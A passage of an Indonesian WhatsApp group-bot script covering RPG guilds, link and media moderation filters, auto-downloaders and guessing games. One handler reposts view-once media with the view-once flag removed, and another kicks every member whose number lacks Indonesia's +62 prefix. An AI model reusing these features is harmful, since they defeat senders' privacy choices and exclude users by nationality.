    if (users[userId] && users[userId].guild) {
        return ReplyRynzz(`Anda sudah menjadi anggota guild: ${users[userId].guild}`);
    }

    guild.members.push(userId);
    users[userId] = { guild: guildName, role: 'member' };

    saveGuilds();
    saveUsers();

    return ReplyRynzz(`Anda berhasil bergabung dengan guild ${guildName}!`);
};

const deleteGuild = (guildName, userId) => {
    const guild = guilds[guildName];
    if (!guild) {
        return ReplyRynzz(`Guild dengan nama ${guildName} tidak ditemukan.`);
    }

    if (guild.leader !== userId) {
        return ReplyRynzz(`Anda tidak memiliki izin untuk menghapus guild ini.`);
    }

    guild.members.forEach(member => {
        delete users[member];
    });

    delete users[guild.leader];
    delete guilds[guildName];

    saveGuilds();
    saveUsers();

    return ReplyRynzz(`Guild ${guildName} berhasil dihapus!`);
};

    const leaveGuild = (userId) => {
    const user = users[userId];
    if (!user || !user.guild) {
        return ReplyRynzz(`Anda tidak berada dalam guild manapun.`);
    }

    const guildName = user.guild;
    const guild = guilds[guildName];

    if (user.role === 'leader') {
        return ReplyRynzz(`Sebagai leader, Anda tidak bisa keluar dari guild. Anda harus menghapus guild.`);
    }

    guild.members = guild.members.filter(member => member !== userId);
    delete users[userId];

    saveGuilds();
    saveUsers();

    return ReplyRynzz(`Anda telah keluar dari guild ${guildName}.`);
};            
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Batas Rpg
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Anti Link Dan Sejenisnya ( Group )
//————————————————————————//

if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await Alice.readMessages([readkey]);
}

        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await Alice.sendMessage(m.chat, { forward: val }, { quoted: m })
    }

    // Anti promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match(`Buy|Promo|Sell|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotAdmins) return
if(isOwner) return
if (isAdmins) return
                Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }


// ANTI BOT

if (m.isBaileys && m.fromMe) {
          ReplyRynzz(`*Bot Lain Terdeteksi*\n\n*Bot Akan Di Keluarkan, Karena Admin Mengaktifkan Anti Bot*`)
    await Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

// ANTI MEDIA
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          ReplyRynzz(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }

// ANTI IMAGE
        if (db.data.chats[m.chat].image && isXMEDIA) {
    if(isXMEDIA === "imageMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          ReplyRynzz(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI VIDEO
        if (db.data.chats[m.chat].antivideo && isXMEDIA) {
    if(isXMEDIA === "videoMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          ReplyRynzz(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTU STICKER
        if (db.data.chats[m.chat].antisticker && isXMEDIA) {
    if(isXMEDIA === "stickerMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          ReplyRynzz(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI AUDIO
        if (db.data.chats[m.chat].antiaudio && isXMEDIA) {
    if(isXMEDIA === "audioMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          ReplyRynzz(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI POLLING
       if (db.data.chats[m.chat].antipoll && isXMEDIA) {
    if(isXMEDIA === "pollCreationMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          ReplyRynzz(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI LOCATION
       if (db.data.chats[m.chat].antilocation && isXMEDIA) {
    if(isXMEDIA === "locationMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          ReplyRynzz(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI DOCUMENT
       if (db.data.chats[m.chat].antidocument && isXMEDIA) {
    if(isXMEDIA === "documentMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          ReplyRynzz(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// ANTI CONTACT
      if (db.data.chats[m.chat].anticontact && isXMEDIA) {
    if(isXMEDIA === "contactMessage"){
        if (isOwner || isAdmins || !isBotAdmins){		  
        } else {
          ReplyRynzz(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return Alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
  
// AutoBio  
if (global.autobio) {
const status = `${botname} Online, ${runtime(process.uptime())}\ `;
Alice.updateProfileStatus(status).catch(_ => _);
}

// Anti Link kick
if (db.data.chats[m.chat].antilinkkick) {
            if (budy.match(`https://`)) {
                let gclink = (`https://`)
                let isLinkThisGc = new RegExp(gclink, 'i')
                if (isAdmins) return ReplyRynzz(`Admin bebas`)
                if (isOwner) return ReplyRynzz(`Owner Bebas`)
                Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        
// ANTI LINK GC DEL
if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return ReplyRynzz(bvl)
if (m.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
               await Alice.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Alice.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
            }
        }

if (AntiLink)
if (budy.toLowerCase().includes("chat.whatsapp.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
 // Antiwame 
if (AntiWame)
if (budy.toLowerCase().includes("wa.me")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
kice = m.sender
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted: m})
} else {
}
//antivirtex 
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return Xbotadmin()
  await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Alice.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
  }
  }
//anti bad words 
if (AntiToxic && !budy.includes("deletebadwords") && !budy.includes("delbadwords"))
if (badwords.some(word => budy.toLowerCase().includes(word))){
if (!isBotAdmins) return
bvl = `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin bebas menggunakan kata kasar`
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\n${pushname} Mohon tidak menggunakan kata kasar di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antiasing 
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!groupAdmins && !isOwner) {
} else
await Alice.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video 
if (AntiLinkYoutubeVid)
if (budy.toLowerCase().includes("youtu.be")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink youtube channel 
if (AntiLinkYoutubeChannel)
if (budy.toLowerCase().includes("youtube.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink instagram 
if (AntiLinkInstagram)
if (budy.toLowerCase().includes("instagram.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink facebook 
if (AntiLinkFacebook)
if (budy.toLowerCase().includes("facebook.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink telegram 
if (AntiLinkTelegram)
if (budy.toLowerCase().includes("t.me")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink tiktok 
if (AntiLinkTiktok)
if (budy.toLowerCase().includes("tiktok.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink twitter 
if (AntiLinkTwitter)
if (budy.toLowerCase().includes("twitter.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin Dan owner Bot bebas kirim link apapun `
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilink all 
if (AntiLinkAll)
if (budy.toLowerCase().includes("http")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilinkbokep 
if (AntiDewasa)
if (budy.toLowerCase().includes("doods")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antiterabox 
if (AntiTerabox)
if (budy.toLowerCase().includes("terabox")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//anti mediafire 
if (AntiMediafire)
if (budy.toLowerCase().includes("mediafire")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return ReplyRynzz(bvl)
if (mek.key.fromMe) return ReplyRynzz(bvl)
if (isOwner) return ReplyRynzz(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
			
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// AutoDownload

// AUTODOWNLOAD
if (global.autodonlod && !m.key.fromMe)
if (budy.match(/tiktok\.com/)) {
await tiktok2(budy).then(async res => {
await xreaction()
await Alice.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: res.title }, { quoted: m });
await Alice.sendMessage(from, { audio: { url: res.no_watermark }, mimetype: 'audio/mpeg', ptt: false }, { quoted: m });
}).catch((err) => {
ReplyRynzz('Maaf, terjadi kesalahan!');
}); // pengalih isu
}
    
if (global.autodonlod && !m.key.fromMe)
if (budy.match(/youtube\.com|youtu\.be/)) {
        await xreaction()
        try {
            let cari = await fetchJson(`${global.beta}/api/download/ytmp3?url=${budy}&apikey=${global.botz}`)
            let hasil = cari.result;
           await Alice.sendMessage(m.chat, { video: { url: hasil.mp4 }, caption: cari.title }, { quoted: m });
           await Alice.sendMessage(from, { audio: { url: hasil.mp3 }, mimetype: 'audio/mpeg', ptt: false }, { quoted: m });
        } catch (e) {
            console.log(e)
            let response = await SaveTube.dl(budy, 2, 'video')
            await Alice.sendMessage(m.chat, { video: { url: response.link }, caption: `Succes\n© ${botname}` }, { quoted: m })
          }
    }

if (global.autodonlod && !m.key.fromMe)
if (budy.match(/instagram\.com/)) {
    await xreaction()
        try {
            const mediaUrl = await igdl(budy);
            const url_media = mediaUrl[0].url;
            const response = await axios.head(url_media);
            const contentType = response.headers['content-type'];
            if (contentType.startsWith('image/')) {
                await Alice.sendMessage(m.chat, { image: { url: url_media }, caption: `Succes\n© ${botname}` }, { quoted: m });
            } else {
                await Alice.sendMessage(m.chat, { video: { url: url_media }, caption: `Succes\n© ${botname}` }, { quoted: m });
            }
        } catch (error) {
            console.log(error);
            return ReplyRynzz(`Terjadi kesalahan saat mengunduh media.` + error)
        }
    }
if (global.autodonlod && !m.key.fromMe)
if (budy.match(/facebook\.com/)) {
await xreaction()
    try {
      let res = await fdown.download(budy);
      if (res && res.length > 0) {
        let videoData = res[0]; 
        let videoUrl = videoData.hdQualityLink || videoData.normalQualityLink; 
        if (videoUrl) {
          let caption = `*Title:* ${videoData.title}\n*Description:* ${videoData.description}\n*Duration:* ${videoData.duration}`;
          await Alice.sendMessage(m.chat, { 
            video: { url: videoUrl }, 
            caption: caption, 
            mimetype: 'video/mp4'
          }, { quoted: m });
        }
      } else {
        return ReplyRynzz(mess.error)
      }
    } catch (e) {
      console.log(e);
      Xerror()
    }
  } 
  

if (m.mtype.includes("groupStatusMentionMessage") && m.isGroup) {
                const idgc = m.key.remoteJid;
                const participant = m.sender
                
                if (idgc.endsWith("@g.us")) {
                    await Alice.sendMessage(idgc, {
                        text: `@${participant.split("@")[0]} your message was deleted, because you tried to mention this group`, 
                        contextInfo: {
                            mentionedJid: [participant],
                            showAdtibution: true
                        }
                    }, { quoted: m })
                    await Alice.deleteMessage(idgc, m.key);
                }
            }
           
        
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Batas Antilink
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Alice.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})} else {
Alice.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {quoted: m})
}}


//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//————————————————————————//
//————————————————————————//
//————————————————————————//
// GAME

		async function reactionMessage(emo) {
			Alice.sendMessage(m.chat, {
				react: {
					text: emo,
					key: m.key
				}
			});
		}
		
		const JwbTrue = (tebak, limit, tambahan) => {
			let teks = `Jawaban Benar ✨\nGame : ${tebak}`
			const context = {
				text: teks,
				contextInfo: {
					mentionedJid: [m.sender],
					forwardingScore: 999999, 
					isForwarded: true, 
						forwardedNewsletterMessageInfo: {
						newsletterName: botname,
						newsletterJid: idch,
					},
					externalAdReply: {
						title: `Jawaban Benar !`,
						body: tebak,
						previewType: "PHOTO",
						thumbnailUrl: thumb,
						sourceUrl: xtele
					}
				}
			};
			return Alice.sendMessage(m.chat, context, {
				quoted: m,
			});
		}

		const waktuHabis = (tebak, jawaban) => {
			let teks = `Waktu Telah Habis!\nGame : ${tebak}\nJawaban: ${jawaban}`
			const context = {
				text: teks,
				contextInfo: {
					mentionedJid: [m.sender],
					forwardingScore: 999999, 
					isForwarded: true, 
					forwardedNewsletterMessageInfo: {
						newsletterName: botname,
						newsletterJid: idch,
					},
					externalAdReply: {
						title: `Waktu Habis`,
						body: "Belajar Dulu Dek",
						previewType: "PHOTO",
						thumbnailUrl: thumb,
						sourceUrl: xtele
					}
				}
			};
			return Alice.sendMessage(m.chat, context, {
				quoted: m,
			});
		}

		if (tebakgame[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakgame[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakgame[m.chat][2]
					JwbTrue("Tebak Game", tebakgame[m.chat][2], `\n\nKirim perintah .tebakgame\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakgame[m.chat][3])
					delete tebakgame[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (tebakgambar[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakgambar[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakgambar[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakgambar[m.chat][2]
					JwbTrue("Tebak Gambar", tebakgambar[m.chat][2], `\n\nKirim perintah .tebakgambar\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakgambar[m.chat][3])
					delete tebakgambar[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (tebakkata[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkata[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkata[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakkata[m.chat][2]
					JwbTrue("Tebak Kata", tebakkata[m.chat][2], `\n\nKirim perintah .tebakkata\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkata[m.chat][3])
					delete tebakkata[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (tebakbendera[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakbendera[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakbendera[m.chat][1]))
				jawaban = json.name.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakbendera[m.chat][2]
					JwbTrue("Tebak Bendera", tebakbendera[m.chat][2], `\n\nKirim perintah .tebakbendera\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakbendera[m.chat][3])
					delete tebakbendera[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (caklontong[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == caklontong[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(caklontong[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += caklontong[m.chat][2]
					JwbTrue("Cak Lontong", caklontong[m.chat][2], `\n\nKirim perintah .caklontong\nuntuk bermain lagi 🎮`)
					clearTimeout(caklontong[m.chat][3])
					delete caklontong[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (susunkata[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == susunkata[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(susunkata[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
